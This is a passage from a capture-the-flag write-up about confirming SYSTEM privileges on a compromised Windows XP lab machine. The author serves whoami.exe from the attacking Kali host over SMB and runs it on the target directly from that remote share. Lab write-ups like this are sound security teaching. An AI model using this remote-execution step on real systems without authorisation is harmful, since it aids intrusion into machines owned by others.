Beyond Root - Whoami
https://0xdf.gitlab.io/2019/02/21/htb-legacy.html

XP doesn’t have a whoami binary or command! So while I suspected that I was system with both of these exploits, how would I know:

C:\WINDOWS\system32>whoami
Whoami'whoami' is not recognized as an internal or external command,
operable program or batch file.

For most users, I can use echo and the %username% environment variable:

C:\WINDOWS\system32>echo %username%
%username%

The fact that that environment variable doesn’t expand is a good sign that I’m system. If I want to go further, I can use whoami.exe, which is already on kali by default:

root@kali# locate whoami.exe
/usr/share/windows-binaries/whoami.exe

I’ll just share that folder over SMB with the command:

root@kali# smbserver.py a /usr/share/windows-binaries/

Now I’ll run it and see I’m system:

C:\WINDOWS\system32>\\10.10.14.14\a\whoami.exe
NT AUTHORITY\SYSTEM

Of course there are other ways I could check, like having access to write in certain places (system32 for example). Getting whoami.exe is certainly one of the easiest and most definitive methods.
